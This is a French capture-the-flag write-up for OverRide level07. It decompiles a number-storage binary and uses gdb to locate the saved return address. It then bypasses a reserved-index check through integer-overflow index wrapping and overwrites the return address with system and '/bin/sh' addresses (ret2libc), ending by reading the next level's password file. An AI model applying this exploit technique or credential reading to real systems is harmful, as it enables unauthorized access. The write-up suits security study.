# **Level 07**

Code decompiler,
```
#include "out.h"

void clear_stdin(void)
{
  int iVar1;
  
  do {
    iVar1 = getchar();
    if ((char)iVar1 == '\n') {
      return;
    }
  } while ((char)iVar1 != -1);
  return;
}

int get_unum(void)
{
  undefined4 local_10 [3];
  
  local_10[0] = 0;
  fflush(stdout);
  __isoc99_scanf("%u",local_10);
  clear_stdin();
  return local_10[0];
}

int store_number(int param_1)
{
  uint uVar1;
  uint uVar2;
  
  printf(" Number: ");
  uVar1 = get_unum();
  printf(" Index: ");
  uVar2 = get_unum();
  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  }
  else {
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
    return 0;
  }
}

int read_number(int param_1)
{
  int iVar1;
  
  printf(" Index: ");
  iVar1 = get_unum();
  printf(" Number at data[%u] is %u\n",iVar1,*(int *)(iVar1 * 4 + param_1));
  return 0;
}

int main(void)
{
	int in_GS_OFFSET;
	char local_1bc [100];
	int local_2c;
	char *local_28[20];
	int local_14;

	local_14 = *(int *)(in_GS_OFFSET + 0x14);

	memset(local_1bc,0,100);


  do {
    printf("Input command: ");
    local_2c = 1;
    fgets((char *)local_28,0x14,stdin);
	local_28[strlen(local_28) - 1] = 0;
	
    if (!strcmp(local_28, "store")) {
      local_2c = store_number(local_1bc);
    }
    else {
      if (!strcmp(local_28, "read")) {
        local_2c = read_number(local_1bc);
      }
      else {

        if (!strcmp(local_28, "quit")) {
          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
            return 0;
          }
                    // WARNING: Subroutine does not return
          __stack_chk_fail();
        }
      }
    }
    if (local_2c == 0) {
      printf(" Completed %s command successfully\n",&local_28);
    }
    else {
      printf(" Failed to do %s command\n",&local_28);
    }
    local_28 = 0;
  } while( true );
}

```

Execution du code,
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:
```
```
Input command: store
 Number: 4
 Index: 4
 Completed store command successfully
Input command: read
 Index: 4
 Number at data[4] is 4
 Completed read command successfully
Input command: store
 Number: -5
 Index: -5
 Completed store command successfully
Input command: read
 Index: -5
 Number at data[4294967291] is 4294967291
 Completed read command successfully
Input command: store
 Number: 42
 Index: 42
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```
On remarque toutde suite plusieurs choses en plus du code, les nombres negatifs bouclent sur les int,
et les index qui sont multiples de 3 ne sont pas accessible.

Allons chercher l'adresse de notre tableau d'int qui store les valeurs et l'adresse de notre EIP,
```
   0x0804884a <+295>:	call   0x80484c0 <puts@plt>
   0x0804884f <+300>:	mov    $0x8048d4b,%eax
   0x08048854 <+305>:	mov    %eax,(%esp)
   0x08048857 <+308>:	call   0x8048470 <printf@plt>
   0x0804885c <+313>:	movl   $0x1,0x1b4(%esp)
   0x08048867 <+324>:	mov    0x804a040,%eax
   0x0804886c <+329>:	mov    %eax,0x8(%esp)

```
Posons un breakpoint au niveau du printf de l'"input command"
```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------


Breakpoint 1, 0x08048857 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
Input command: store
 Number: 42
 Index: 1
 Completed store command successfully

```
42 est egal a 2a en hexa, allons regarder la stack pour trouver l'adresse exacte de notre tableau,
```
(gdb) x/136wx $esp
0xffffd520:	0x08048d4b	0xffffd6d8	0xf7fcfac0	0xf7fdc714
0xffffd530:	0x00000098	0xffffffff	0xffffd7fc	0xffffd7a8
0xffffd540:	0x00000000	0x00000000	0x0000002a	0x00000000
0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000

```
Nous retrouvons notr 42 en 0xffffd548, donc le debut de notre tableau est en 0xffffd544
EIP:
```
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048857 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c

```
adresse eip -> 0xffffd70c
Faisons la difference entre 0xffffd70c et 0xffffd544
0xffffd70c - 0xffffd544 = 456
456 / 4 = 114 (/4 car tableau d'int).
```
Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

```
4158936339 en hexa -> F7E45513
Cela correspond bien a l'adresse de notre saved eip.
Or, nous ne pouvons pas reecrire directement sur l'index 114 car c'est un multiple de 3,
mais nous savons que les int peuvent overflow ici.
Pour faire cela, nous allons prendre notre index, 114 et le multiplier par 4 ce qui egal a 456,
or multiplier par 4 reviens a 114 << 2 donc en binaire, 
114 = 00000000000000000000000001110010
456 = 00000000000000000000000111001000
Il y a bien un decalage de 2 bytes vers la gauche.
Donc les 2 derniers bytes (tout a gauche) ne sont pas pris en compte ici.
10000000000000000000000001110010 = 2147483762
Maintenant que nous avons notre index, allons recuper l'adresse de system et d'un "/bin/sh",
```
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) find __libc_start_main, +999999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
addr system -> 0xf7e6aed0 = 4159090384
addr "/bin/sh" -> 0xf7f897ec = 4160264172
Executons maintenant le code en placant l'addr de system a l'index de 114 (2147483762),
et placons l'addr de "bin/sh" a 116, juste apres.
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

```
